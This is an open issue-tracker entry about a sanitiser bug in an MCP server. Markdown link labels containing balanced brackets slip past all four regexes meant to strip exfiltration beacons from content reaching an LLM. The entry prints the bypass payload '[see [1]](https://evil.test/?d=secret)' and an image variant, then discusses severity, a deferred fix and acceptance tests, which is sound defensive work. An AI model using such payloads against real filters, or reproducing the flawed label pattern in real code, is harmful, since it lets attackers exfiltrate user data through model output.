---
id: 005
title: "A markdown label containing balanced brackets defeats all four beacon patterns"
status: open
severity: P1
tags: [security, prompt-injection]
class-id: missing-validation
source: found while benchmarking the RC-11 pattern rewrite
created: 2026-09-02
---

# A markdown label containing balanced brackets defeats all four beacon patterns

## Problem

`stripMarkdownBeacons`'s four patterns use `[^\]…\n]*` for the label, which
cannot cross a `]`. A label that itself contains a bracketed span therefore ends
the class early, the following `]` is consumed as the label's closer, and the
`(` test fails against the second `]`. No match, and the URL is returned intact.

**Confirmed, and pre-existing — not introduced by the RC-11 rewrite. Both the
old and new patterns leak it identically:**

```
input   [see [1]](https://evil.test/?d=secret)
output  [see [1]](https://evil.test/?d=secret)      ← unchanged, both patterns
```

CommonMark permits balanced brackets in link text, so this renders as a live
link and the beacon fires.

## Why it is P1

It is a complete bypass of the markdown beacon defence — the stage that exists
to stop exfiltration beacons reaching the model — reachable by an attacker who
controls any response body served as `text/markdown`, any text on the
post-processor wrap's channels, and response header text. The payload is one
character longer than the shape already tested.

## Instances

- `src/lib/response/strip-blocks.ts` — `MARKDOWN_EXTERNAL_IMAGE_PATTERN`,
  `MARKDOWN_EXTERNAL_LINK_PATTERN`,
  `MARKDOWN_DANGEROUS_SCHEME_IMAGE_PATTERN`,
  `MARKDOWN_DANGEROUS_SCHEME_LINK_PATTERN` — all four share the label class.

## Why it is filed rather than fixed

The label class is exactly what invariant 15 and RC-11 just made load-bearing
for linearity: excluding `[` is what turned an 82-second quadratic into 1.4 ms.
A fix that lets the label span brackets must not reintroduce that — which rules
out the naive `[\s\S]*?` and any nesting-aware backtracking form, and points at
a linear left-to-right scan that finds `](` first and then examines the
surrounding label and URL.

That is a rewrite of the beacon stage, on the branch that has just rewritten it
once, with no further review round scheduled. Filing it is the honest call.

## Severity in this deployment — read before scheduling this

The P1 above rates the defect against the stage's stated purpose. Rated against
how this server is actually deployed it is much lower, and the difference is
worth stating rather than leaving for whoever picks this up:

- **The consumers are our own team, over stdio, into Claude Code.** There is no
  untrusted tenant and no multi-user blast radius. The attacker is a remote host
  we chose to `curl`, not a user of this server.
- **A beacon needs a renderer that fetches the URL.** A terminal MCP client does
  not auto-load remote images, so the exfiltration step needs a human to click.
  The file header already scopes this subsystem as "best-effort textual
  sanitisation, not a full HTML sandbox — content reaches an LLM, not a
  renderer."
- **Both plausible fixes are bad trades here.** A real CommonMark parser is the
  wheel not to reinvent, but `parse5` was already evaluated and rejected in this
  file's header (60 KB, 2× slower on small bodies, a runtime dependency). A
  fifth hand-rolled pattern is the option that has already failed four times.

**Recommendation: leave open, do not schedule.** Reopen if the deployment
changes — a hosted or shared instance, an HTTP transport exposed beyond the
team, or a client that renders markdown images eagerly — or if a markdown
parser lands in the dependency tree for another reason and the fix becomes
free. The limitation is documented at the pattern definitions in
`strip-blocks.ts` so the next reader meets it there.

## Sweep

```bash
rg -n 'MARKDOWN_.*_PATTERN =' -A2 src/lib/response/strip-blocks.ts
```

## Acceptance criteria

- [ ] `[see [1]](https://evil.test/x)` has its URL removed.
- [ ] `![alt [x]](https://evil.test/x)` likewise, and as an IMAGE not a link.
- [ ] The five ReDoS floods in `strip-blocks.test.ts` still complete inside 2 s,
      and the teeth check in `LESSONS.md` RC-11 still holds.
- [ ] A positive control asserts legitimate prose with brackets and parentheses
      is untouched.
